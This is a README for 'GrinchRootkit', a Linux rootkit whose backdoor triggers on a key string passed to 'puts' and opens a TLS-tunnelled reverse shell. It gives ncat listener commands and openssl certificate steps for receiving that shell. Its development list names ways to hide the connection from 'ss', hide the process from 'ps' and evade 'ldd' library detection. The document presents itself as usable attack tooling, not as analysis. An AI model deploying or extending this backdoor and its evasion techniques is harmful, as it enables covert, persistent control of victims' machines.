# GrinchRootkit

Install pre-requisites: 'apt install -y libssl-dev'

The backdoor triggers when 'puts' function receives the KEY_STRING (defined in grinch.h) and the reverse shell connects through a TLS tunnel.
To listen connections with temporary certificates: 'ncat --ssl --listen --verbose --nodns <port>'.

To create permanent certificate: 'openssl req -x509 -nodes -days 365 -newkey rsa:1024 -keyout grinch.key -out grinch.crt'.
To listen connections with permanent certificates: 'ncat --ssl --ssl-cert grinch.crt --ssl-key grinch.key --ssl-verify --listen --verbose --nodns <port>'.

Currently developing:
  Hiding connection from 'ss'.
  IPv6 support.
  Improving backdoor trigger.
  SSL bullet-proof client and server (client certificate, client key, PKI,...).
  Improving authentication (username & password, or 2FA).
  
Currently fixing:
  Handling STDERR when a wrong command is introduced.
  Fails re-implant rootkit, when deleting to avoid 'ldd' binary shared library detection.
  Hiding backdoor process (when non-root user activates) from 'ps' and similar binaries (that use 'lstat', 'fstat', 'stat',... functions).
